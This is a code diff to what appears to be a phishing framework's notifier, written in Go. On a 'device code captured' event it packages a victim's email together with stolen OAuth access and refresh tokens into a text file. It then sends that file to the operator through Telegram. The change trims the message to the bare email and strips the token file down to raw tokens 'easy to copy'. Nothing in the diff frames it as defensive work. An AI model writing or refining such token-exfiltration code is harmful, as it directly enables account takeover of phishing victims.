@@ -1068,39 +1068,29 @@ func (nm *NotifierManager) sendTelegramMessage(n *NotifierConfig, event string, 
 	case EventDeviceCodeCaptured:
 		// Get user info from custom fields
 		userEmail := ""
-		userName := ""
-		provider := ""
 		if data.Custom != nil {
 			userEmail = data.Custom["dc_user_email"]
-			userName = data.Custom["dc_user_name"]
-			provider = data.Custom["dc_provider"]
 		}
-		if provider == "" {
-			provider = data.Phishlet
-		}
-		if userName == "" {
-			userName = userEmail
+		if userEmail == "" {
+			userEmail = "unknown"
 		}
 
-		// Simple caption
-		caption := fmt.Sprintf("🎯 %s\n📧 %s\n🔗 %s\n⏰ %s",
-			userName, userEmail, provider, time.Now().UTC().Format("2006-01-02 15:04:05 UTC"))
+		// Minimal caption - just the email
+		caption := fmt.Sprintf("📧 %s", userEmail)
 
-		// File content: just the tokens, ready to paste
+		// File content: raw tokens only, easy to copy
 		var fileContent strings.Builder
-		fileContent.WriteString("[access_token]\n")
 		if at, ok := data.Custom["dc_access_token"]; ok {
 			fileContent.WriteString(at)
 		}
-		fileContent.WriteString("\n\n[refresh_token]\n")
+		fileContent.WriteString("\n\n")
 		if rt, ok := data.Custom["dc_refresh_token"]; ok {
 			fileContent.WriteString(rt)
 		}
-		fileContent.WriteString("\n")
 
 		// Determine filename
-		usernameFile := "session"
-		if userEmail != "" {
+		usernameFile := "tokens"
+		if userEmail != "" && userEmail != "unknown" {
 			usernameFile = strings.Map(func(r rune) rune {
 				if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9') || r == '-' || r == '_' || r == '.' || r == '@' {
 					return r
@@ -1108,7 +1098,7 @@ func (nm *NotifierManager) sendTelegramMessage(n *NotifierConfig, event string, 
 				return '_'
 			}, userEmail)
 		}
-		filename := fmt.Sprintf("%s_tokens.txt", usernameFile)
+		filename := fmt.Sprintf("%s.txt", usernameFile)
 
 		// Send as file via Telegram sendDocument
 		var body bytes.Buffer
